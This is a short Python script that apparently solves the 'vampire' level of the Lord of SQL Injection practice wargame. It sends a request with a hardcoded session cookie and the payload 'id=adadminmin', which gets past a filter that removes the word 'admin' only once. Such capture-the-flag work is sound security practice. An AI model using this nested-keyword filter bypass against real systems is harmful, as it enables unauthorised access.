import requests

url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?"
cookie = {'PHPSESSID':'4b8kq11mkmch95tvu9qu2s8add'}

def solve():
    query = "id=adadminmin"
    res = requests.get(url=url+query, cookies=cookie)
    if "VAMPIRE Clear!" in res.text:
        print("VAMPIRE Clear!")

if __name__ == "__main__":
    solve()
